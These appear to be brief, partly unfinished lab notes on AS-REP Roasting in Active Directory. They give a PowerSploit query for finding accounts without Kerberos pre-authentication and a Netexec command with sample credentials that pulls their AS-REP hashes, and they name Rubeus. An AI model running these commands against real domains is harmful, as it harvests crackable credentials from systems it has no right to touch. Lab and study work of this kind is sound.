# AS-REP Roasting
## Summary
AS-REP
## Attack Requirements
Notes
## Enumeration Methods
### PowerSploit
```
Get-Domainuser | Where-Object { $_.UserAccountControl -like "*DONT_REQ_PREAUTH"}
```
## Attack Overview
Using Rubeus
## Tools
- Rubeus
- Netexec


### Netexec
```
nxc ldap 10.0.2.15 -u fcastle -p Password1 --asreproast nxc-aspreproast-output.log
```
